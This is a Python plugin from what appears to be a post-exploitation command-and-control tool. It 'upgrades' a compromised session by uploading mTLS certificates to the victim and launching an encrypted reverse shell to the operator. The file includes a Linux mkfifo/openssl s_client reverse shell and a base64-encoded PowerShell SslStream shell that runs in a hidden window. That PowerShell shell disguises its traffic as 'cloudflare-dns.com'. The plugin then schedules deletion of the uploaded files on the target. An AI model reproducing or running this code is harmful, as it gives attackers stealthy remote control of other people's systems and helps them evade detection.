"""
upgrade_mtls — provision a session with the handler's mTLS client bundle
and re-connect over the mTLS listener (default port 9443).
"""

import argparse
import base64
import os
import subprocess
import time

from ..api import plugin, SessionContext

LINUX_CERT = '/tmp/.mtls_client.pem'
LINUX_KEY  = '/tmp/.mtls_client.key'
LINUX_CA   = '/tmp/.mtls_ca.pem'
WIN_PFX    = r'C:\Windows\Temp\mtls_client.pfx'
PFX_PASS   = 'changeme'

CLEANUP_DELAY = 15


def _fmt_size(nbytes):
    for unit in ('B', 'KB', 'MB', 'GB'):
        if nbytes < 1024.0:
            return f"{nbytes:.1f} {unit}"
        nbytes /= 1024.0
    return f"{nbytes:.1f} TB"


def _build_pfx(handler):
    pfx = handler.mtls_client_cert.rsplit('.', 1)[0] + '.pfx'
    if os.path.isfile(pfx):
        return pfx
    for src in (handler.mtls_client_cert, handler.mtls_client_key, handler.mtls_ca_cert):
        if not os.path.isfile(src):
            return None
    cmd = [
        handler._openssl_executable(), 'pkcs12', '-export',
        '-in', handler.mtls_client_cert,
        '-inkey', handler.mtls_client_key,
        '-certfile', handler.mtls_ca_cert,
        '-out', pfx,
        '-passout', f'pass:{PFX_PASS}',
    ]
    try:
        r = subprocess.run(cmd, capture_output=True, text=True, check=False)
    except FileNotFoundError:
        return None
    if r.returncode != 0 or not os.path.isfile(pfx):
        return None
    return pfx


def _check_handler_bundle(handler):
    return all(
        os.path.isfile(p)
        for p in (handler.mtls_client_cert, handler.mtls_client_key, handler.mtls_ca_cert)
    )


def _upload_via_powershell(session, local_path, remote_path):
    from ...constants import XFER_MARK_START, XFER_MARK_END

    handler = session._handler
    sock = session._client_sock

    if not os.path.isfile(local_path):
        session.print(f"Local file not found: {local_path}", 'red')
        return False

    total = os.path.getsize(local_path)
    local_hash = handler._sha256_file(local_path)
    chunk_size = 1500

    session.print(
        f"Uploading {_fmt_size(total)} in {_fmt_size(chunk_size)} chunks "
        f"(PowerShell base64)",
        'yellow',
    )
    handler._flush_shell(sock, timeout=1.0)

    if not handler._remote_truncate(sock, remote_path, 'windows'):
        session.print("Failed to prepare remote file.", 'red')
        return False
    handler.recv_output(sock, timeout=2.0)

    transferred = 0
    first = True

    with open(local_path, 'rb') as f:
        while transferred < total:
            data = f.read(chunk_size)
            if not data:
                break

            path = handler._escape_path(remote_path, 'windows')
            b64 = base64.b64encode(data).decode()
            mode = 'Create' if first else 'Append'
            script = (
                f"$d=[Convert]::FromBase64String('{b64}');"
                f"$fs=[IO.File]::Open('{path}',[IO.FileMode]::{mode});"
                f"$fs.Write($d,0,$d.Length);$fs.Close();"
                f"'{XFER_MARK_START}OK{XFER_MARK_END}'"
            )

            handler._flush_shell(sock, timeout=0.2)
            if not handler._send_win_ps(sock, script):
                session.print(f"\nChunk delivery failed at offset {transferred}", 'red')
                return False

            output = handler.recv_output(sock, timeout=60.0, until_marker=XFER_MARK_END)
            payload = handler._extract_marked(output)
            if payload != 'OK':
                session.print(f"\nChunk write failed at offset {transferred}", 'red')
                snippet = output[:400].replace('\r', '\\r').replace('\n', '\\n')
                session.print(f"  remote output: {snippet!r}", 'yellow')
                return False

            first = False
            transferred += len(data)
            pct = int(100 * transferred / total) if total else 100
            bar = '#' * (pct // 2) + '-' * (50 - pct // 2)
            print(
                f"\r  [{bar}] {pct:3d}% "
                f"{_fmt_size(transferred)}/{_fmt_size(total)}",
                end='',
            )

    print()
    handler._flush_shell(sock, timeout=1.5)

    remote_size = handler._remote_file_size(sock, remote_path, 'windows')
    if remote_size != total:
        session.print(
            f"Size mismatch: local={total} remote={remote_size}", 'red'
        )
        return False

    remote_hash = handler._remote_sha256(sock, remote_path, 'windows')
    if remote_hash == local_hash:
        session.print("Integrity verified.", 'green')
        return True

    lh = local_hash[:16] if local_hash else 'None'
    rh = remote_hash[:16] if remote_hash else 'None'
    session.print(f"Hash mismatch: local={lh}... remote={rh}...", 'red')
    return False


def _linux_openssl_cmd(host, port):
    fifo = '/tmp/.mtls_f'
    return (
        f'rm -f {fifo}; mkfifo {fifo}; '
        f'sh -i < {fifo} 2>&1 | '
        f'openssl s_client -quiet -connect {host}:{port} '
        f'-cert {LINUX_CERT} -key {LINUX_KEY} -CAfile {LINUX_CA} '
        f'-verify_return_error 2>/dev/null > {fifo}; '
        f'rm -f {fifo}'
    )


def _windows_payload(host, port):
    return (
        "$sslProtocols = [System.Security.Authentication.SslProtocols]::Tls12; "
        f"$cert = New-Object System.Security.Cryptography.X509Certificates.X509Certificate2('{WIN_PFX}','{PFX_PASS}'); "
        "$certColl = New-Object System.Security.Cryptography.X509Certificates.X509CertificateCollection; "
        "$certColl.Add($cert); "
        f"$TCPClient = New-Object Net.Sockets.TCPClient('{host}', {port}); "
        "$NetworkStream = $TCPClient.GetStream(); "
        "$SslStream = New-Object Net.Security.SslStream($NetworkStream,$false,({$true} -as [Net.Security.RemoteCertificateValidationCallback])); "
        "$SslStream.AuthenticateAsClient('cloudflare-dns.com',$certColl,$sslProtocols,$false); "
        "if(!$SslStream.IsEncrypted -or !$SslStream.IsSigned) {$SslStream.Close();exit} "
        "$StreamWriter = New-Object IO.StreamWriter($SslStream); "
        "function WriteToStream ($String) {[byte[]]$script:Buffer = New-Object System.Byte[] 4096 ;$StreamWriter.Write($String + 'SHELL> ');$StreamWriter.Flush()}; "
        "WriteToStream ''; "
        "while(($BytesRead = $SslStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {"
        "$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);"
        "$Output = try {Invoke-Expression $Command 2>&1 | Out-String} catch {$_ | Out-String}"
        "WriteToStream ($Output)"
        "}"
        "$StreamWriter.Close()"
    )


def _sq(s):
    return "'" + s.replace("'", "'\\''") + "'"


@plugin.command(
    name='upgrade_mtls',
    platforms=['linux', 'windows', 'unix'],
    description='Upload the mTLS client bundle and reconnect over the mTLS listener.',
)
def run(session: SessionContext, args):
    parser = argparse.ArgumentParser(prog='upgrade_mtls')
    parser.add_argument('--host', '-rh', help='Handler IP')
    parser.add_argument('--port', '-rp', type=int, help='Handler mTLS port')
    parser.add_argument('--no-upload', '-nup', action='store_true', help='Skip upload — assume the bundle is already on target')
    parser.add_argument('--keep-bundle', '-kbd', action='store_true', help='Do NOT delete the bundle from the target after launch')
    try:
        opts = parser.parse_args(args)
    except SystemExit:
        return 1

    handler = session._handler
    sock = session._client_sock

    if not getattr(handler, 'mtls_port', None):
        session.print('Handler has no mTLS listener configured.', 'red')
        return 1
    if not _check_handler_bundle(handler):
        session.print(
            'mTLS client bundle is missing on the operator side. '
            'Delete mtls_certs/ and let the handler regenerate it, '
            'or run the handler once with the mTLS listener enabled.',
            'red',
        )
        return 1

    port = opts.port or handler.mtls_port
    host = opts.host or sock.getsockname()[0]

    session.log_event(f'upgrade_mtls: starting (host={host}, port={port})')
    session.print(f'Preparing mTLS upgrade → {host}:{port}', 'yellow')

    # ------------------------------------------------------------------
    # 1. Upload the bundle
    # ------------------------------------------------------------------
    if not opts.no_upload:
        if session.is_windows:
            local_pfx = _build_pfx(handler)
            if not local_pfx:
                session.print(
                    'Failed to build PKCS#12 bundle from PEM files. '
                    'Ensure openssl is available on the operator machine.',
                    'red',
                )
                return 1
            session.print(f'Staging {os.path.basename(local_pfx)} → {WIN_PFX} ...', 'yellow')
            if not _upload_via_powershell(session, local_pfx, WIN_PFX):
                session.print('Upload failed.', 'red')
                return 1
        else:
            for src, dst in (
                (handler.mtls_client_cert, LINUX_CERT),
                (handler.mtls_client_key,  LINUX_KEY),
                (handler.mtls_ca_cert,     LINUX_CA),
            ):
                session.print(f'Uploading {os.path.basename(src)} → {dst} ...', 'yellow')
                if not session.upload(src, dst, resume=False):
                    session.print(f'Upload failed for {src}', 'red')
                    return 1
            session.run_shell(
                f'chmod 600 {LINUX_CERT} {LINUX_KEY} {LINUX_CA} 2>/dev/null; true',
                timeout=5.0,
            )

    # ------------------------------------------------------------------
    # 2. Launch the mTLS shell in the background
    # ------------------------------------------------------------------
    if session.is_windows:
        payload = _windows_payload(host, port)

        b64 = base64.b64encode(payload.encode('utf-16-le')).decode('ascii')
        if len(b64) > 7500:
            session.print(
                f'Encoded payload too large ({len(b64)} chars) for cmd.exe '
                'command line. Reduce the payload or use the upload-then-run path.',
                'red',
            )
            return 1

        launcher = (
            "Start-Process -FilePath powershell.exe -WindowStyle Hidden "
            f"-ArgumentList '-NoProfile','-NonInteractive','-EncodedCommand','{b64}'"
        )
        session.print('Launching mTLS PowerShell session...', 'yellow')
        handler._flush_shell(sock, timeout=1.0)
        sock.sendall(f'{launcher}\r\n'.encode())
        time.sleep(1.5)
        handler.recv_output(sock, timeout=1.5)
    else:
        inner = _linux_openssl_cmd(host, port)
        payload = f'for i in $(seq 1 30); do {inner} && break; sleep 2; done'
        bg = f"setsid sh -c {_sq(payload)} >/dev/null 2>&1 </dev/null &"

        session.print('Launching mTLS shell in background...', 'yellow')
        handler._flush_shell(sock, timeout=1.0)
        sock.sendall((bg + '\n').encode())
        time.sleep(1.0)

    session.print('Launcher dispatched.', 'green')

    # ------------------------------------------------------------------
    # 3. Optional cleanup — scheduled on the target, non-blocking
    # ------------------------------------------------------------------
    if not opts.keep_bundle:
        if session.is_windows:
            cleanup_ps = (
                f"Start-Process -WindowStyle Hidden -FilePath powershell.exe "
                f"-ArgumentList '-NoProfile','-Command',"
                f"\"Start-Sleep -Seconds {CLEANUP_DELAY};"
                f"Remove-Item -Force -ErrorAction SilentlyContinue '{WIN_PFX}'\""
            )
            handler._flush_shell(sock, timeout=0.5)
            sock.sendall(f'{cleanup_ps}\r\n'.encode())
            time.sleep(0.5)
        else:
            cleanup = (
                f"(sleep {CLEANUP_DELAY}; "
                f"rm -f {LINUX_CERT} {LINUX_KEY} {LINUX_CA}) "
                f">/dev/null 2>&1 </dev/null &"
            )
            handler._flush_shell(sock, timeout=0.5)
            sock.sendall((cleanup + '\n').encode())
            time.sleep(0.3)

        session.print(
            f'Bundle cleanup scheduled on target (~{CLEANUP_DELAY}s).',
            'cyan',
        )

    session.print(
        "Done. Run 'status' in a moment — the new session should appear "
        "on the mTLS listener with its own ID.",
        'green',
    )
    session.log_plugin_result('upgrade_mtls', 'launched', f'{host}:{port}')
    return 0